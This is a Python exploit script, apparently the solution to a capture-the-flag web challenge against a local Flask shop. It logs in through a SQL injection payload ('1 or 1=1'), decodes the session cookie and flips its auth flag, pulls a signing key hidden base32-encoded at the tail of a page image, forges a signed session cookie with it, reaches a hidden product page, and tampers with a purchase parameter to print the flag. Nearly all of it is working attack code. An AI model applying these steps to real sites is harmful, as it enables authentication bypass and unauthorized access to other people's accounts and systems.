import os
import requests
import base64
from lxml import etree
from flask_session_cookie_manager3 import FSCM


# In fact, we should use sqlmap first to check if SQL injection vulnerabilities exist
url = 'http://127.0.0.1:5000/'
payload = 'login?Email=1%20or%201=1%20or%201=1'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'
}


# Get and Modify the Session
session = requests.session()
data = session.post(url+payload, headers=headers)
cookie = session.cookies
sess = cookie.get_dict()
text = FSCM.decode(sess['session']).decode("utf-8")
newtext = text.replace('"auth":0', '"auth":1')
newtext = newtext.replace("true", "True") # 转换成json之后true无法被Python识别，所以要改成大写
print("sql注入{status}".format(status="成功" if text.find("true")+1 else '失败'))


# Get the picture
pngname = "target.png"
if os.path.exists(pngname):
    os.remove(pngname)
tree = etree.HTML(data.content)
src = tree.xpath('/html/body/div[2]/div/div/div/div/div[1]/div/div[1]/img/@src')
img = requests.get(url + str(src[0]).strip('../'))
with open(pngname, 'wb') as file:
    file.write(img.content)
file.close()


# Get the secret key

# In Linux, run 
#   'strings pngname | tail -1 | base32 -d'
# In Windows, run following code

fileData = open('target.png','rb')
all = fileData.readlines()
tail = all[-1]
# print(tail.find(bytes.fromhex('AE426082'))) # PNG 文件尾
string = tail[tail.find(bytes.fromhex('AE426082'))+4:]
secret_key = base64.b32decode(string).decode('utf-8')
secret_key = secret_key[secret_key.find("= ")+2:]
print("secret_key 已获得："+secret_key)
fileData.close()
os.remove(pngname)

# Encode session
newsession = FSCM.encode(secret_key, newtext)
print("伪造的Session为："+newsession)
headers['Cookie']='session={payload}'.format(payload=newsession)


# open the final product
data3 = session.post(url+"finalpro", headers=headers)
if data3.status_code >= 400 or str(data3.content).find('ERROR')+1:
    print("访问隐藏页面失败")
else:
    print("访问隐藏页面成功")


# buy final product
data4 = session.post(url+'finalbuy?Time=10000000000000000', headers=headers)
tree = etree.HTML(data4.content)
src = tree.xpath('/html/body/div/p/text()')
print("flag为：",src[0])